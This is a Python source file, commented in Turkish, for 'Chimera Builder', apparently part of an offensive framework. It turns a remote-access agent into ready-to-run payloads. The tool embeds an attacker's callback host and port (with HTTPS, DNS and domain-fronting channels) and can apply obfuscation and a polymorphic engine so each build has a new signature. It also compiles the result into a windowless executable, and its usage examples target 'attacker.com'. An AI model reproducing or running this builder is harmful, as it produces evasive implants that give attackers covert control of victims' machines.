#!/usr/bin/env python3
"""
Chimera Builder - Payload Oluşturma Aracı

Chimera agent kaynak kodunu okur, kullanıcının belirlediği konfigürasyon
değerlerini (IP, Port vb.) gömer ve çalıştırmaya hazır bir payload dosyası üretir.

    1. Standalone CLI:
        python3 build/chimera_builder.py --lhost 10.0.0.1 --lport 4444 -o /tmp/agent.py

    2. Framework Modülü (Tavsiye Edilen):
        mah > use payloads/python/chimera/generate
        mah (generate) > set LHOST 10.0.0.1
        mah (generate) > set LPORT 4444
        mah (generate) > set STRIP_COMMENTS true
        mah (generate) > run

Planlanan Özellikler:
    - Obfuscation (AST manipülasyonu, string şifreleme, junk code)
    - Exe dönüştürme (PyInstaller/Nuitka entegrasyonu)
"""

import os
import sys
import hashlib
import time
import re
import ipaddress
import argparse
import subprocess
import shutil
from datetime import datetime

# Obfuscator kütüphanesini içe aktarmaya çalış
try:
    from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
    _OBFUSCATOR_AVAILABLE = True
except ImportError:
    try:
        _builder_dir = os.path.dirname(os.path.abspath(__file__))
        _project_root = os.path.dirname(_builder_dir)
        if _project_root not in sys.path:
            sys.path.insert(0, _project_root)
        from build.chimera_obfuscator import obfuscate as _run_obfuscator, print_obfuscation_report
        _OBFUSCATOR_AVAILABLE = True
    except ImportError:
        _OBFUSCATOR_AVAILABLE = False

# Polimorfik engine'i içe aktarmaya çalış
try:
    from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
    _POLYMORPHIC_AVAILABLE = True
except ImportError:
    try:
        _builder_dir = os.path.dirname(os.path.abspath(__file__))
        _project_root = os.path.dirname(_builder_dir)
        if _project_root not in sys.path:
            sys.path.insert(0, _project_root)
        from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
        _POLYMORPHIC_AVAILABLE = True
    except ImportError:
        _POLYMORPHIC_AVAILABLE = False



# ============================================================
# Agent kaynak dosyasının konumu
# ============================================================
_AGENT_RELATIVE_PATH = os.path.join(
    "modules", "payloads", "python", "chimera", "agent.py"
)


def _find_project_root() -> str:
    """Proje kök dizinini bulur.

    build/ dizininden bir üst dizine, veya main.py'nin bulunduğu dizine
    kadar geriye doğru arar.

    Returns:
        str: Proje kök dizininin mutlak yolu.

    Raises:
        FileNotFoundError: Proje kök dizini bulunamadıysa.
    """
    # 1. Bu scriptin bulunduğu dizinden bir üst (build/ -> proje kök)
    script_dir = os.path.dirname(os.path.abspath(__file__))
    candidate = os.path.dirname(script_dir)

    if os.path.isfile(os.path.join(candidate, "main.py")):
        return candidate

    # 2. CWD'den dene (framework içinden çalıştırılıyorsa)
    cwd = os.getcwd()
    if os.path.isfile(os.path.join(cwd, "main.py")):
        return cwd

    # 3. Yukarı doğru ara
    current = script_dir
    for _ in range(5):
        current = os.path.dirname(current)
        if os.path.isfile(os.path.join(current, "main.py")):
            return current

    raise FileNotFoundError(
        "[!] Proje kök dizini bulunamadı. "
        "Builder'ı proje dizininden veya build/ dizininden çalıştırın."
    )


def _resolve_agent_path(project_root: str) -> str:
    """Agent kaynak dosyasının tam yolunu çözer.

    Args:
        project_root: Proje kök dizini.

    Returns:
        str: agent.py'nin mutlak yolu.

    Raises:
        FileNotFoundError: Agent dosyası bulunamadıysa.
    """
    agent_path = os.path.join(project_root, _AGENT_RELATIVE_PATH)
    agent_path = os.path.normpath(agent_path)

    if not os.path.isfile(agent_path):
        raise FileNotFoundError(f"[!] Agent dosyası bulunamadı: {agent_path}")

    return agent_path


# ============================================================
# Doğrulama (Validation) Fonksiyonları
# ============================================================
def validate_host(host: str) -> bool:
    """IP adresi veya hostname doğrulaması yapar.

    Args:
        host: Doğrulanacak IP/hostname değeri.

    Returns:
        bool: Geçerliyse True.
    """
    if not host or not host.strip():
        return False

    # IP adresi kontrolü
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass

    # Hostname kontrolü (RFC 1123)
    hostname_regex = re.compile(
        r'^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$'
    )
    return bool(hostname_regex.match(host))


def validate_port(port) -> bool:
    """Port numarası doğrulaması yapar.

    Args:
        port: Doğrulanacak port değeri.

    Returns:
        bool: Geçerliyse True (1-65535 arası).
    """
    try:
        port_int = int(port)
        return 1 <= port_int <= 65535
    except (ValueError, TypeError):
        return False


# ============================================================
# Builder Çekirdek Fonksiyonu
# ============================================================
def build_payload(
    lhost: str,
    lport: int,
    reconnect_delay: int = 5,
    max_reconnect: int = -1,
    channel_type: str = "https",
    dns_domain: str = "",
    fronting_domain: str = "",
    output_path: str = None,
    agent_source_path: str = None,
    strip_comments: bool = False,
    obfuscate: bool = False,
    polymorphic: bool = False,
    build_bin: bool = False,
    quiet: bool = False
) -> dict:
    """Chimera agent payload'ını oluşturur.

    Agent kaynak kodunu okur, konfigürasyon placeholder'larını kullanıcının
    belirlediği değerlerle değiştirir ve opsiyonel olarak obfuscation uygular,
    ardından dosyaya yazar.

    Args:
        lhost:              Handler IP adresi veya hostname.
        lport:              Handler port numarası.
        reconnect_delay:    Yeniden bağlanma bekleme süresi (saniye).
        max_reconnect:      Maksimum yeniden bağlanma denemesi (-1 = sınırsız).
        output_path:        Çıktı dosya yolu (None ise sadece kodu döner).
        agent_source_path:  Agent kaynak dosyası yolu (None ise otomatik bulur).
        strip_comments:     Yorum satırlarını kaldır.
        obfuscate:          AST rename + XOR string encrypt + junk code uygula.
        polymorphic:        Polimorfik engine uygula (her build farklı imza üretir).
        build_bin:          PyInstaller kullanarak çalıştırılabilir ikili (binary) dosyasına dönüştür.
        quiet:              Ekrana çıktı basma.

    Returns:
        dict: Build sonucu bilgileri.
            - success (bool)          : İşlem başarılı mı?
            - code (str)              : Oluşturulan payload kodu.
            - output_path (str)       : Kayıt yolu (dosyaya yazıldıysa).
            - error (str)             : Hata mesajı (başarısızsa).
            - stats (dict)            : İstatistikler (boyut, hash, satır sayısı).
            - obfuscation_stats (dict): Obfuscation istatistikleri (obfuscate=True ise).
    """
    result = {
        "success": False,
        "code": "",
        "output_path": None,
        "error": None,
        "stats": {},
        "obfuscation_stats": {},
        "polymorphic_mutations": []
    }

    # --- Doğrulama ---
    if not validate_host(lhost):
        result["error"] = f"[!] Geçersiz LHOST değeri: '{lhost}'. Geçerli bir IP veya hostname girin."
        return result

    if not validate_port(lport):
        result["error"] = f"[!] Geçersiz LPORT değeri: '{lport}'. 1-65535 arası bir port girin."
        return result

    lport = int(lport)

    if not isinstance(reconnect_delay, int) or reconnect_delay < 0:
        result["error"] = f"[!] Geçersiz RECONNECT_DELAY: '{reconnect_delay}'. Pozitif bir tamsayı olmalı."
        return result

    if not isinstance(max_reconnect, int):
        result["error"] = f"[!] Geçersiz MAX_RECONNECT: '{max_reconnect}'. Tamsayı olmalı (-1 = sınırsız)."
        return result

    # --- Agent kaynak kodunu oku ---
    try:
        if agent_source_path and os.path.isfile(agent_source_path):
            src_path = agent_source_path
        else:
            project_root = _find_project_root()
            src_path = _resolve_agent_path(project_root)
    except FileNotFoundError as e:
        result["error"] = str(e)
        return result

    try:
        with open(src_path, "r", encoding="utf-8") as f:
            agent_code = f.read()
    except Exception as e:
        result["error"] = f"[!] Agent dosyası okunamadı: {e}"
        return result

    original_size = len(agent_code.encode("utf-8"))

    # --- Placeholder kontrolü ---
    if '{{LHOST}}' not in agent_code:
        result["error"] = (
            "[!] Agent kodunda '{{LHOST}}' placeholder'ı bulunamadı. "
            "Kod zaten build edilmiş olabilir."
        )
        return result

    if '{{LPORT}}' not in agent_code:
        result["error"] = (
            "[!] Agent kodunda '{{LPORT}}' placeholder'ı bulunamadı. "
            "Kod zaten build edilmiş olabilir."
        )
        return result

    # --- Konfigürasyon değerlerini göm ---
    agent_code = agent_code.replace(
        'LHOST = "{{LHOST}}"',
        f'LHOST = "{lhost}"'
    )
    agent_code = agent_code.replace(
        "LPORT = {{LPORT}}",
        f"LPORT = {lport}"
    )
    agent_code = agent_code.replace(
        f"RECONNECT_DELAY = 5",
        f"RECONNECT_DELAY = {reconnect_delay}"
    )
    agent_code = agent_code.replace(
        f"MAX_RECONNECT = -1",
        f"MAX_RECONNECT = {max_reconnect}"
    )
    # İletişim kanalı konfigürasyonları
    agent_code = agent_code.replace(
        'CHANNEL_TYPE = "{{CHANNEL_TYPE}}"',
        f'CHANNEL_TYPE = "{channel_type}"'
    )
    agent_code = agent_code.replace(
        'DNS_DOMAIN = "{{DNS_DOMAIN}}"',
        f'DNS_DOMAIN = "{dns_domain}"'
    )
    agent_code = agent_code.replace(
        'FRONTING_DOMAIN = "{{FRONTING_DOMAIN}}"',
        f'FRONTING_DOMAIN = "{fronting_domain}"'
    )

    # --- Yorum satırlarını kaldır (opsiyonel) ---
    if strip_comments:
        lines = agent_code.split("\n")
        cleaned_lines = []
        in_docstring = False
        docstring_char = None

        for line in lines:
            stripped = line.strip()

            # Docstring kontrolü (basit)
            if not in_docstring:
                if stripped.startswith('"""') or stripped.startswith("'''"):
                    docstring_char = stripped[:3]
                    # Tek satırlık docstring
                    if stripped.count(docstring_char) >= 2:
                        continue
                    in_docstring = True
                    continue
                # Tek satırlık yorum
                if stripped.startswith("#") and not stripped.startswith("#!"):
                    continue
                cleaned_lines.append(line)
            else:
                if docstring_char in stripped:
                    in_docstring = False
                continue

        agent_code = "\n".join(cleaned_lines)

    # --- İstatistikler ---
    final_size = len(agent_code.encode("utf-8"))
    line_count = agent_code.count("\n") + 1
    md5_hash = hashlib.md5(agent_code.encode("utf-8")).hexdigest()
    sha256_hash = hashlib.sha256(agent_code.encode("utf-8")).hexdigest()

    result["stats"] = {
        "original_size": original_size,
        "final_size": final_size,
        "line_count": line_count,
        "md5": md5_hash,
        "sha256": sha256_hash,
        "lhost": lhost,
        "lport": lport,
        "reconnect_delay": reconnect_delay,
        "max_reconnect": max_reconnect,
        "strip_comments": strip_comments,
        "source_file": src_path,
        "build_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    result["code"] = agent_code
    result["success"] = True

    # --- Obfuscation (opsiyonel) ---
    if obfuscate:
        if not _OBFUSCATOR_AVAILABLE:
            if not quiet:
                print("[!] UYARI: chimera_obfuscator yüklenemedi, obfuscation atlandı.")
        else:
            if not quiet:
                print("[*] Obfuscation uygulanıyor...")
            obf_result = _run_obfuscator(agent_code)
            if obf_result["success"]:
                agent_code = obf_result["code"]
                result["code"] = agent_code
                result["obfuscation_stats"] = obf_result["stats"]
                # Hash ve boyut istatistiklerini güncelle
                final_enc = agent_code.encode("utf-8")
                result["stats"]["final_size"]  = len(final_enc)
                result["stats"]["line_count"]  = agent_code.count("\n") + 1
                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
                result["stats"]["obfuscated"]  = True
            else:
                if not quiet:
                    print(f"[!] Obfuscation başarısız: {obf_result['error']}")

    # --- Polimorfik Engine (opsiyonel) ---
    if polymorphic:
        if not _POLYMORPHIC_AVAILABLE:
            if not quiet:
                print("[!] UYARI: chimera_polymorphic yüklenemedi, polimorfik dönüşüm atlandı.")
        else:
            if not quiet:
                print("[*] Polimorfik dönüşüm uygulanıyor...")
            poly_result = _run_polymorphic(agent_code)
            if poly_result["success"]:
                agent_code = poly_result["code"]
                result["code"] = agent_code
                result["polymorphic_mutations"] = poly_result["mutations"]
                # Hash ve boyut istatistiklerini güncelle
                final_enc = agent_code.encode("utf-8")
                result["stats"]["final_size"]  = len(final_enc)
                result["stats"]["line_count"]  = agent_code.count("\n") + 1
                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
                result["stats"]["polymorphic"] = True
            else:
                if not quiet:
                    print(f"[!] Polimorfik dönüşüm başarısız: {poly_result['error']}")

    # --- Dosyaya yaz ve İkili Derleme (Build) ---
    if build_bin and not output_path:
        result["error"] = "[!] Derleme işlemi için OUTPUT belirtilmek zorundadır."
        result["success"] = False
        return result

    if output_path:
        py_path = output_path
        if not py_path.endswith(".py") and not build_bin:
            py_path += ".py"
        elif build_bin:
            py_path = output_path + ".py" if not output_path.endswith(".py") else output_path

        # Çıktı dizinini oluştur
        output_dir = os.path.dirname(output_path)
        if output_dir and not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir, exist_ok=True)
            except Exception as e:
                result["error"] = f"[!] Çıktı dizini oluşturulamadı: {e}"
                result["success"] = False
                return result

        try:
            with open(py_path, "w", encoding="utf-8") as f:
                f.write(agent_code)
            # Çalıştırılabilir yap (Unix)
            if sys.platform != "win32":
                os.chmod(py_path, 0o755)
            result["output_path"] = os.path.abspath(py_path)
        except Exception as e:
            result["error"] = f"[!] Dosya yazma hatası: {e}"
            result["success"] = False
            return result

        if build_bin:
            if not quiet:
                print("[*] PyInstaller ile yürütülebilir dosyaya dönüştürülüyor (bu işlem biraz vakit alabilir)...")
            try:
                exe_out_dir = os.path.dirname(os.path.abspath(result["output_path"]))
                pyinstaller_cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    "--noconfirm",
                    "--distpath", exe_out_dir,
                    os.path.abspath(py_path)
                ]
                
                process = subprocess.run(
                    pyinstaller_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                if process.returncode != 0:
                    result["error"] = f"[!] Derleme hatası: PyInstaller başarısız oldu.\nAyrıntılı Hata:\n{process.stderr}"
                    result["success"] = False
                    return result
                    
                # PyInstaller başarılı, derlenen dosyayı bul
                base_name = os.path.splitext(os.path.basename(py_path))[0]
                # PyInstaller genellikle .exe üretir (Win/Linux farketmeksizin PE olarak hedeflenmişse vs ama aslında linux'ta uzantısız ELF çıkarır).
                expected_out_name = base_name + (".exe" if sys.platform == "win32" else "")
                expected_out_path = os.path.join(exe_out_dir, expected_out_name)
                
                # Eğer output_path belirli bir isimse ve expected_out_path ondan farklıysa
                final_output = output_path
                if sys.platform == "win32" and not final_output.endswith(".exe"):
                    final_output += ".exe"
                    
                # Eğer farklıysa taşı
                if os.path.exists(expected_out_path) and os.path.abspath(expected_out_path) != os.path.abspath(final_output):
                    shutil.move(expected_out_path, final_output)
                elif not os.path.exists(expected_out_path) and not sys.platform == "win32":
                    # Linux için Pyinstaller uzantısız üretmiş olabilir
                    if os.path.exists(os.path.join(exe_out_dir, base_name)) and os.path.abspath(os.path.join(exe_out_dir, base_name)) != os.path.abspath(final_output):
                       shutil.move(os.path.join(exe_out_dir, base_name), final_output) 
                       expected_out_path = os.path.join(exe_out_dir, base_name)
                
                if os.path.exists(final_output):
                    result["output_path"] = os.path.abspath(final_output)
                elif os.path.exists(expected_out_path):
                    result["output_path"] = os.path.abspath(expected_out_path)

                result["stats"]["build_bin"] = True
                result["stats"]["final_size"] = os.path.getsize(result["output_path"])
                
                # PyInstaller kalıntılarını temizle
                spec_file = os.path.join(os.getcwd(), base_name + ".spec")
                build_dir = os.path.join(os.getcwd(), "build", base_name)
                
                # macOS .app kalıntıları (noconsole/windowed flag sebebiyle oluşabilen klasörler)
                app_dir_cwd = os.path.join(os.getcwd(), base_name + ".app")
                app_dir_out = os.path.join(exe_out_dir, base_name + ".app")

                if os.path.exists(spec_file):
                    os.remove(spec_file)
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                if sys.platform == "darwin":
                    if os.path.exists(app_dir_cwd):
                        shutil.rmtree(app_dir_cwd)
                    if os.path.exists(app_dir_out):
                        shutil.rmtree(app_dir_out)
                    
            except Exception as e:
                result["error"] = f"[!] Derleme sırasında beklenmedik sistem hatası: {e}"
                result["success"] = False
                return result

    return result


def print_build_report(result: dict):
    """Build sonuç raporunu ekrana basar.

    Args:
        result: build_payload() fonksiyonunun döndürdüğü sonuç dict'i.
    """
    if not result["success"]:
        print(f"\n  {result['error']}\n")
        return

    stats = result["stats"]
    border = "═" * 58

    print(f"\n  ╔{border}╗")
    print(f"  ║  🐍  CHIMERA BUILDER - Build Raporu                     ║")
    print(f"  ╠{border}╣")
    print(f"  ║  Durum         : ✅ Başarılı                            ║")
    print(f"  ║  Zaman         : {stats['build_time']:<39}║")
    print(f"  ╠{border}╣")
    print(f"  ║  📡 Konfigürasyon                                       ║")
    print(f"  ║  ├─ LHOST           : {stats['lhost']:<35}║")
    print(f"  ║  ├─ LPORT           : {str(stats['lport']):<35}║")
    print(f"  ║  ├─ RECONNECT_DELAY : {str(stats['reconnect_delay']):<35}║")
    print(f"  ║  └─ MAX_RECONNECT   : {str(stats['max_reconnect']):<35}║")
    print(f"  ╠{border}╣")
    print(f"  ║  📦 Payload Bilgileri                                    ║")
    print(f"  ║  ├─ Kaynak Dosya    : agent.py                          ║")

    # Boyut bilgisi
    original_kb = stats['original_size'] / 1024
    final_kb = stats['final_size'] / 1024
    size_str = f"{stats['final_size']:,} bytes ({final_kb:.1f} KB)"
    print(f"  ║  ├─ Boyut           : {size_str:<35}║")
    print(f"  ║  ├─ Satır Sayısı    : {str(stats['line_count']):<35}║")

    if stats['strip_comments']:
        saved = stats['original_size'] - stats['final_size']
        saved_pct = (saved / stats['original_size']) * 100 if stats['original_size'] > 0 else 0
        strip_str = f"Evet (-%{saved_pct:.1f}, -{saved:,} bytes)"
        print(f"  ║  ├─ Yorum Temizleme : {strip_str:<35}║")

    obf_flag = stats.get('obfuscated', False)
    obf_str = "✅ Evet" if obf_flag else "Hayır"
    print(f"  ║  ├─ Obfuscation     : {obf_str:<35}║")

    bin_flag = stats.get('build_bin', False)
    bin_str = "✅ Evet" if bin_flag else "Hayır"
    print(f"  ║  ├─ İkili Derleme   : {bin_str:<35}║")

    poly_flag = stats.get('polymorphic', False)
    poly_str = "✅ Evet" if poly_flag else "Hayır"
    print(f"  ║  ├─ Polimorfik      : {poly_str:<35}║")

    print(f"  ╠{border}╣")
    print(f"  ║  🔐 Hash Değerleri                                      ║")
    print(f"  ║  ├─ MD5    : {stats['md5']:<44}║")
    print(f"  ║  └─ SHA256 : {stats['sha256'][:44]:<44}║")

    if result["output_path"]:
        print(f"  ╠{border}╣")
        print(f"  ║  💾 Çıktı Dosyası                                      ║")
        # Yolu kısalt (çok uzunsa)
        out_display = result["output_path"]
        if len(out_display) > 44:
            out_display = "..." + out_display[-41:]
        print(f"  ║  └─ {out_display:<53}║")

    print(f"  ╠{border}╣")
    print(f"  ║  📋 Kullanım                                            ║")
    print(f"  ║  └─ python3 <payload_dosyası>                           ║")
    print(f"  ╚{border}╝\n")



# ============================================================
# Standalone CLI Giriş Noktası
# ============================================================
def main():
    """Standalone CLI modunda builder'ı çalıştırır."""
    parser = argparse.ArgumentParser(
        prog="chimera_builder",
        description=(
            "🐍 Chimera Builder - Payload Oluşturma Aracı\n"
            "Agent koduna konfigürasyon değerlerini gömer ve "
            "çalıştırmaya hazır payload üretir."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Örnekler:\n"
            "  %(prog)s --lhost 10.0.0.1 --lport 4444 -o /tmp/agent.py\n"
            "  %(prog)s --lhost 192.168.1.50 --lport 8080 --strip-comments -o payload.py\n"
            "  %(prog)s --lhost attacker.com --lport 443 --reconnect-delay 10 -o chimera.py\n"
        )
    )

    parser.add_argument(
        "--lhost", required=True,
        help="Handler IP adresi veya hostname (zorunlu)."
    )
    parser.add_argument(
        "--lport", type=int, required=True,
        help="Handler port numarası (zorunlu, 1-65535)."
    )
    parser.add_argument(
        "-o", "--output", required=True,
        help="Payload çıktı dosya yolu (zorunlu)."
    )
    parser.add_argument(
        "--reconnect-delay", type=int, default=5,
        help="Yeniden bağlanma bekleme süresi, saniye (varsayılan: 5)."
    )
    parser.add_argument(
        "--max-reconnect", type=int, default=-1,
        help="Maksimum yeniden bağlanma denemesi, -1=sınırsız (varsayılan: -1)."
    )
    parser.add_argument(
        "--agent-source",
        help="Özel agent kaynak dosyası yolu (varsayılan: otomatik bulunur)."
    )
    parser.add_argument(
        "--strip-comments", action="store_true",
        help="Yorum satırlarını ve docstring'leri kaldır."
    )
    parser.add_argument(
        "--obfuscate", action="store_true",
        help="AST rename + XOR string şifreleme + junk code uygula."
    )
    parser.add_argument(
        "--polymorphic", action="store_true",
        help="Polimorfik engine uygula (her build farklı imza üretir)."
    )
    parser.add_argument(
        "--build-bin", action="store_true",
        help="PyInstaller kullanarak çalıştırılabilir ikili dosyaya (binary) dönüştür."
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true",
        help="Sadece hata/başarı mesajı göster, detaylı rapor gösterme."
    )

    args = parser.parse_args()

    result = build_payload(
        lhost=args.lhost,
        lport=args.lport,
        reconnect_delay=args.reconnect_delay,
        max_reconnect=args.max_reconnect,
        output_path=args.output,
        agent_source_path=args.agent_source,
        strip_comments=args.strip_comments,
        obfuscate=args.obfuscate,
        polymorphic=args.polymorphic,
        build_bin=args.build_bin,
        quiet=args.quiet,
    )

    # Obfuscation raporu (ayrı)
    if args.obfuscate and result.get("obfuscation_stats") and not args.quiet and _OBFUSCATOR_AVAILABLE:
        print_obfuscation_report({"success": True, "stats": result["obfuscation_stats"]})

    if args.quiet:
        if result["success"]:
            print(f"[+] Payload oluşturuldu: {result['output_path']}")
        else:
            print(result["error"])
    else:
        print_build_report(result)

    sys.exit(0 if result["success"] else 1)


if __name__ == "__main__":
    main()
